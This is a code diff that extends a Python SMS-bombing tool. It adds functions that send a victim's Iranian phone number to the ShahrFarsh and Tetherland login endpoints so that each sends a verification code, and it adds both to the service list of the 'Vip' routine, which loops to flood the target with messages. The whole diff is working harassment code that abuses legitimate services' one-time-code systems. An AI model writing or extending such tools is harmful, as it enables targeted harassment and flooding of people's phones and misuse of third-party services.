@@ -50,6 +50,33 @@ def snap(phone):
     except Exception as e:
         print(f"{r}[!] Snap Exception: {e}")
         return False
+def shahrfarsh(phone):
+    url = "https://shahrfarsh.com/Account/Login"
+    payload = {"phoneNumber": "0" + phone.split("+98")[1]}
+    try:
+        response = post(url, data=payload, timeout=5)
+        if response.status_code == 200:
+            print(f'{g}(ShahrFarsh) {a}Code Sent')
+            return True
+        else:
+            print(f'{r}[-] (ShahrFarsh) Failed or No Response{a}')
+    except Exception as e:
+        print(f'{r}[!] ShahrFarsh Exception: {e}{a}')
+        return False
+def tetherland(phone):
+    url = "https://service.tetherland.com/api/v5/login-register"
+    payload = {"mobile": "0" + phone.split("+98")[1]}
+    try:
+        response = post(url, json=payload, timeout=5)
+        if response.status_code == 200:
+            print(f'{g}(Tetherland) {a}Code Sent')
+            return True
+        else:
+            print(f'{r}[-] (Tetherland) Failed or No Response{a}')
+    except Exception as e:
+        print(f'{r}[!] Tetherland Exception: {e}{a}')
+        return False
+
 
 def pindo(phone):
     pindo_url = "https://api.pindo.ir/v1/user/login-register/"
@@ -137,7 +164,10 @@ def send_service_safe(service, phone):
 
 # Simple SMS bomber
 def Vip(phone, Time):
-    services = [snap, gap, divar, alibaba, mek, drnext, pindo, okorosh]
+    services = [
+    snap, gap, divar, alibaba, mek, okorosh,
+    drnext, pindo, shahrfarsh, tetherland
+]
     total_services = len(services)
     
     print_slow(f"{p}╔═════[ SMS Bombing Initiated ]═════╗")
